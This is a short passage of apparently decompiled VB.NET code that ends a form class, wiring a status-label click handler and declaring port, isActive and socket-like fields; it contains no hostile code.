				toolStripStatusLabel = Me._ToolStripStatusLabel8
				If toolStripStatusLabel IsNot Nothing Then
					AddHandler toolStripStatusLabel.Click, value2
				End If
			End Set
		End Property

		' Token: 0x040001EE RID: 494
		Private int_0 As Integer

		' Token: 0x040001EF RID: 495
		Public isActive As Boolean

		' Token: 0x040001F0 RID: 496
		Public port As Integer

		' Token: 0x040001F1 RID: 497
		Public S As SK
	End Class
End Namespace
